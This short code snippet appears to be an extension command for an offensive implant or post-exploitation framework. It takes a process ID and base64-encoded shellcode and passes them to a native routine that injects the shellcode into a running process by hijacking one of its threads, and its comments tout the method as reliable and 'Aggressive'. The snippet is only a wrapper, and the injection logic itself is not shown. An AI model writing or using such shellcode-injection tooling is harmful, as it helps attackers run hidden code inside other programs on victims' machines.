// Usage: extension load inject_remote_thread_hijack <pid> <b64_shellcode>
// Best for: Reliability on running processes (Aggressive)

if args.len() < 2 { return "Usage: <pid> <payload>"; }
return native_inject_remote_hijack(args[0], args[1]);
